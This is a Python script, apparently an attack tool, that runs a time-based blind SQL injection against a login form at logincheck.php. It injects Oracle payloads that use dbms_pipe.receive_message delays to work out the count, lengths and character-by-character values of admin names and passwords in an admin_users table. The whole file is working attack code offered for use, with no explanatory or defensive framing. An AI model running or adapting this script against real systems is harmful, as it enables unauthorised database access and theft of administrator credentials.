from urllib.parse import quote, urlencode
import requests
import time


def encode_url(s: str):
    uri = []
    byte_s = s.encode('utf-8')
    for e in byte_s:
        uri.append('%' + hex(e).replace('0x', '').zfill(2))
    return ''.join(uri)


base = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_/'
url = 'http://localhost/logincheck.php'

#猜测ADMIN_NAME个数
numbers = 0
for l in range(1, 20):
    payload = "1' or (select decode(count(admin_name),{}, dbms_pipe.receive_message('RDS',5),0) from admin_users)=0--".format(
        l)
    start_time = time.time()
    res = requests.post(url,
                        data={
                            'username': encode_url(payload),
                            'password': '1234',
                            'formsubmit': '登录'
                        })
    if time.time() - start_time > 3:
        numbers = l
        print('numbers: ', l)
        break

# 猜测ADMIN_NAME每项长度
len = []
for i in range(0, numbers):
    for l in range(1, 20):
        payload = "1' or (select decode(length(admin_name),{},dbms_pipe.receive_message('RDS',5),0) from (select t.admin_name, rownum rn from admin_users t) nn where nn.rn >{} and nn.rn <={}) = 0--".format(
            l, i, i + 1)
        start_time = time.time()
        res = requests.post(url,
                            data={
                                'username': encode_url(payload),
                                'password': '1234',
                                'formsubmit': '登录'
                            })
        if time.time() - start_time > 3:
            len.append(l)
            print('length: ', l)
            break

#猜测ADMIN_USER每项的值
user_name = []
for i in range(0, numbers):
    name = ''
    for l in range(1, len[i] + 1):
        for c in base:
            payload = "1' or (select decode(ascii(substr(admin_name,{},{})),{},dbms_pipe.receive_message('RDS',5),0) from (select t.admin_name, rownum rn from admin_users t) nn where nn.rn >{} and nn.rn <={})=0--".format(
                l, l, ord(c), i, i + 1)
            start_time = time.time()
            res = requests.post(url,
                                data={
                                    'username': encode_url(payload),
                                    'password': '1234',
                                    'formsubmit': '登录'
                                })
            if time.time() - start_time > 3:
                name += c
                break
    user_name.append(name)
    print('admin_user: ', name)

#猜测ADMIN_PASSWORD个数
for l in range(1, 20):
    payload = "1' or (select decode(count(admin_password),{}, dbms_pipe.receive_message('RDS',5),0) from admin_users)=0--".format(
        l)
    start_time = time.time()
    res = requests.post(url,
                        data={
                            'username': encode_url(payload),
                            'password': '1234',
                            'formsubmit': '登录'
                        })
    if time.time() - start_time > 3:
        numbers = l
        print('numbers: ', l)
        break

# 猜测ADMIN_PASSWORD每项长度
len = []
for i in range(0, numbers):
    for l in range(1, 20):
        payload = "1' or (select decode(length(admin_password),{}, dbms_pipe.receive_message('RDS',5),0) from (select t.admin_password, rownum rn from admin_users t) nn where nn.rn >{} and nn.rn <={}) =0--".format(
            l, i, i + 1)
        start_time = time.time()
        res = requests.post(url,
                            data={
                                'username': encode_url(payload),
                                'password': '1234',
                                'formsubmit': '登录'
                            })
        if time.time() - start_time > 3:
            len.append(l)
            print('length: ', l)
            break

#猜测ADMIN_PASSWORED每项的值
user_password = []
for i in range(0, numbers):
    name = ''
    for l in range(1, len[i] + 1):
        for c in base:
            payload = "1' or (select decode(ascii(substr(admin_password,{},{})),{}, dbms_pipe.receive_message('RDS',5),0) from (select t.admin_password, rownum rn from admin_users t) nn where nn.rn >{} and nn.rn <={})=0--".format(
                l, l, ord(c), i, i + 1)
            start_time = time.time()
            res = requests.post(url,
                                data={
                                    'username': encode_url(payload),
                                    'password': '1234',
                                    'formsubmit': '登录'
                                })
            if time.time() - start_time > 3:
                name += c
                break
    user_password.append(name)
    print('admin_password: ', name)
